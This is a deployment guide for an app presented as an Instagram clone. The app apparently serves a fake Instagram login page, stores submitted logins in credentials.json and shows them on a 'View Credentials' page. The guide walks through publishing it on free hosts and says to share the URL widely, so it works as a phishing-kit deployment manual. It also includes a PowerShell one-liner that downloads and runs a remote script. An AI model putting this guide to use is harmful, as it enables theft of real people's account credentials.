# 🚀 Deploy Instagram Clone to Render.com

## Quick Deploy (Easiest Method)

### Step 1: Create GitHub Account (if you don't have one)
1. Go to https://github.com
2. Sign up for free

### Step 2: Push Your Code to GitHub

Open PowerShell in this folder and run:

```powershell
# Initialize git repository
git init

# Add all files
git add .

# Commit
git commit -m "Initial commit - Instagram clone"

# Create a new repository on GitHub at: https://github.com/new
# Name it: instagram-clone
# Then run these commands (replace YOUR_USERNAME with your GitHub username):

git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/instagram-clone.git
git push -u origin main
```

### Step 3: Deploy to Render.com

1. **Go to Render.com**: https://render.com
2. **Sign up** with your GitHub account (free)
3. **Click "New +"** → **"Web Service"**
4. **Connect your GitHub repository**: instagram-clone
5. **Configure the service:**
   - **Name**: instagram-clone (or any name you like)
   - **Runtime**: Node
   - **Build Command**: `npm install`
   - **Start Command**: `npm start`
   - **Instance Type**: Free
6. **Click "Create Web Service"**

### Step 4: Wait for Deployment
- Render will automatically build and deploy your app
- You'll get a URL like: `https://instagram-clone-xxxx.onrender.com`
- First deployment takes 2-3 minutes

### Step 5: Access Your Site
Your deployed URLs will be:
- **Login Page**: https://your-app.onrender.com/src/html/loginPage.html  
- **View Credentials**: https://your-app.onrender.com/src/html/viewCredentials.html

---

## Alternative: Deploy to Railway.app

### Step 1: Push to GitHub (same as above)

### Step 2: Deploy to Railway
1. **Go to Railway**: https://railway.app
2. **Sign up** with GitHub (free $5 credit monthly)
3. **Click "New Project"** → **"Deploy from GitHub repo"**
4. **Select** your instagram-clone repository
5. **Click "Deploy"**
6. **Add Domain**: 
   - Click on your service
   - Go to "Settings" → "Networking"
   - Click "Generate Domain"

Your site will be live at: `https://your-app.up.railway.app`

---

## Alternative: Deploy to Fly.io

### Step 1: Install Fly CLI

```powershell
# Run in PowerShell
iwr https://fly.io/install.ps1 -useb | iex
```

### Step 2: Deploy

```powershell
# Login to Fly.io
fly auth login

# Launch app (follow the prompts)
fly launch

# Deploy
fly deploy
```

---

## 📝 Important Notes

1. **Free Tier Limitations:**
   - Render: App sleeps after 15 mins of inactivity (wakes up when accessed)
   - Railway: $5 credit per month (about 500 hours)
   - Fly.io: 3 shared VMs free

2. **Database File:**
   - On free hosting, the credentials.json file will reset when the server restarts
   - For persistent storage, you'd need to use a proper database (MongoDB, PostgreSQL)

3. **First Load:**
   - First access might be slow (20-30 seconds) due to cold start
   - Subsequent loads will be faster

4. **Custom Domain:**
   - All services support custom domains
   - You can add your own domain in the settings

---

## 🆘 Troubleshooting

**Site not loading?**
- Check the deployment logs on your hosting platform
- Make sure the build completed successfully

**Can't see credentials?**
- The database resets on free tier deployments
- This is normal behavior for file-based storage

**Port error?**
- Already fixed! Server now uses process.env.PORT

---

## 🎉 You're Done!

Your Instagram clone is now live on the internet! Share your URL with anyone and they can access it from anywhere in the world.

**Recommended**: Start with Render.com - it's the easiest and completely free!
